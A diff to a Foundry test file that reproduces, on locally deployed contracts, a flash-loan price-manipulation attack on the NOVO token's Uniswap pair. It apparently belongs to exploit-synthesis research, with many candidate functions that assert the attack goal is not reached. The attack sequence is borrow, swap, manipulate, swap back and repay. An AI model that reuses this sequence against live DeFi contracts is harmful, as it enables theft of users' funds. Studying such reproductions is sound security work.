@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
+import "./AttackContract.sol";
 import "./NOVO.sol";
 import "@utils/QueryBlockchain.sol";
 import "forge-std/Test.sol";
@@ -14,13 +15,15 @@ contract NOVOTest is Test, BlockLoader {
     UniswapV2Pair pair;
     UniswapV2Factory factory;
     UniswapV2Router router;
+    AttackContract attackContract;
+    address owner;
     address attacker;
-    address owner = address(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
     address wbnbAddr;
     address novoAddr;
     address pairAddr;
     address factoryAddr;
     address routerAddr;
+    address attackContractAddr;
     uint256 blockTimestamp = 1653831935;
     uint112 reserve0pair = 120090152116998645;
     uint112 reserve1pair = 395001031454274158328;
@@ -39,9 +42,7 @@ contract NOVOTest is Test, BlockLoader {
     uint256 balanceOfwbnbnovo = 0;
 
     function setUp() public {
-        vm.warp(blockTimestamp);
-        attacker = address(this);
-        vm.startPrank(owner);
+        owner = address(this);
         wbnb = new WBNB();
         wbnbAddr = address(wbnb);
         novo = new NOVO();
@@ -66,6 +67,9 @@ contract NOVOTest is Test, BlockLoader {
         factoryAddr = address(factory);
         router = new UniswapV2Router(address(factory), address(0xdead));
         routerAddr = address(router);
+        attackContract = new AttackContract();
+        attackContractAddr = address(attackContract);
+        attacker = address(attackContract);
         novo.afterDeploy(address(pair));
         // Initialize balances and mock flashloan.
         novo.transfer(address(novo), balanceOfnovonovo);
@@ -73,7 +77,6 @@ contract NOVOTest is Test, BlockLoader {
         novo.transfer(address(pair), balanceOfnovopair);
         wbnb.approve(attacker, UINT256_MAX);
         novo.approve(attacker, UINT256_MAX);
-        vm.stopPrank();
     }
 
     function printBalance(string memory tips) public {
@@ -114,9 +117,17 @@ contract NOVOTest is Test, BlockLoader {
             novo.decimals()
         );
         emit log_string("");
-        emit log_string("Attacker Balances: ");
-        queryERC20BalanceDecimals(address(wbnb), attacker, wbnb.decimals());
-        queryERC20BalanceDecimals(address(novo), attacker, novo.decimals());
+        emit log_string("Attackcontract Balances: ");
+        queryERC20BalanceDecimals(
+            address(wbnb),
+            address(attackContract),
+            wbnb.decimals()
+        );
+        queryERC20BalanceDecimals(
+            address(novo),
+            address(attackContract),
+            novo.decimals()
+        );
         emit log_string("");
         emit log_string("");
         emit log_string("");
@@ -183,6 +194,7 @@ contract NOVOTest is Test, BlockLoader {
     }
 
     function test_gt() public {
+        vm.startPrank(attacker);
         borrow_wbnb(17e18);
         printBalance("After step0 ");
         swap_pair_wbnb_novo(wbnb.balanceOf(attacker));
@@ -196,6 +208,7 @@ contract NOVOTest is Test, BlockLoader {
         payback_wbnb((17e18 * 1003) / 1000);
         printBalance("After step5 ");
         require(attackGoal(), "Attack failed!");
+        vm.stopPrank();
     }
 
     function check_gt(
@@ -205,6 +218,7 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
@@ -213,6 +227,7 @@ contract NOVOTest is Test, BlockLoader {
         swap_pair_novo_wbnb(amt3);
         payback_wbnb(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand000(
@@ -222,6 +237,7 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
@@ -229,6 +245,7 @@ contract NOVOTest is Test, BlockLoader {
         swap_pair_novo_wbnb(amt3);
         payback_wbnb(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand001(
@@ -239,6 +256,7 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
@@ -247,6 +265,7 @@ contract NOVOTest is Test, BlockLoader {
         swap_pair_novo_wbnb(amt4);
         payback_wbnb(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand002(
@@ -256,6 +275,7 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
@@ -264,6 +284,7 @@ contract NOVOTest is Test, BlockLoader {
         swap_pair_novo_wbnb(amt3);
         payback_wbnb(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand003(
@@ -274,6 +295,7 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
@@ -282,6 +304,7 @@ contract NOVOTest is Test, BlockLoader {
         swap_pair_novo_wbnb(amt4);
         payback_wbnb(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand004(
@@ -292,6 +315,7 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
@@ -301,6 +325,7 @@ contract NOVOTest is Test, BlockLoader {
         swap_pair_novo_wbnb(amt4);
         payback_wbnb(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand005(
@@ -312,6 +337,7 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
@@ -321,6 +347,7 @@ contract NOVOTest is Test, BlockLoader {
         swap_pair_novo_wbnb(amt5);
         payback_wbnb(amt6);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand006(
@@ -331,6 +358,7 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
@@ -340,6 +368,7 @@ contract NOVOTest is Test, BlockLoader {
         swap_pair_novo_wbnb(amt4);
         payback_wbnb(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand007(
@@ -351,6 +380,7 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
@@ -360,6 +390,7 @@ contract NOVOTest is Test, BlockLoader {
         swap_pair_novo_wbnb(amt5);
         payback_wbnb(amt6);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand008(
@@ -371,6 +402,7 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
@@ -381,6 +413,7 @@ contract NOVOTest is Test, BlockLoader {
         swap_pair_novo_wbnb(amt5);
         payback_wbnb(amt6);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand009(
@@ -393,6 +426,7 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt7 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
@@ -403,6 +437,7 @@ contract NOVOTest is Test, BlockLoader {
         swap_pair_novo_wbnb(amt6);
         payback_wbnb(amt7);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand010(
@@ -414,6 +449,7 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
@@ -424,6 +460,7 @@ contract NOVOTest is Test, BlockLoader {
         swap_pair_novo_wbnb(amt5);
         payback_wbnb(amt6);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand011(
@@ -436,6 +473,7 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt7 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
@@ -446,6 +484,7 @@ contract NOVOTest is Test, BlockLoader {
         swap_pair_novo_wbnb(amt6);
         payback_wbnb(amt7);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand012(
@@ -458,6 +497,7 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt7 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
@@ -469,6 +509,7 @@ contract NOVOTest is Test, BlockLoader {
         swap_pair_novo_wbnb(amt6);
         payback_wbnb(amt7);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand013(
@@ -482,6 +523,7 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt7,
         uint256 amt8
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt8 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
@@ -493,6 +535,7 @@ contract NOVOTest is Test, BlockLoader {
         swap_pair_novo_wbnb(amt7);
         payback_wbnb(amt8);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand014(
@@ -505,6 +548,7 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt7 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
@@ -516,6 +560,7 @@ contract NOVOTest is Test, BlockLoader {
         swap_pair_novo_wbnb(amt6);
         payback_wbnb(amt7);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand015(
@@ -529,6 +574,7 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt7,
         uint256 amt8
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt8 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_novo(amt1);
@@ -541,5 +587,6 @@ contract NOVOTest is Test, BlockLoader {
         swap_pair_novo_wbnb(amt7);
         payback_wbnb(amt8);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 }
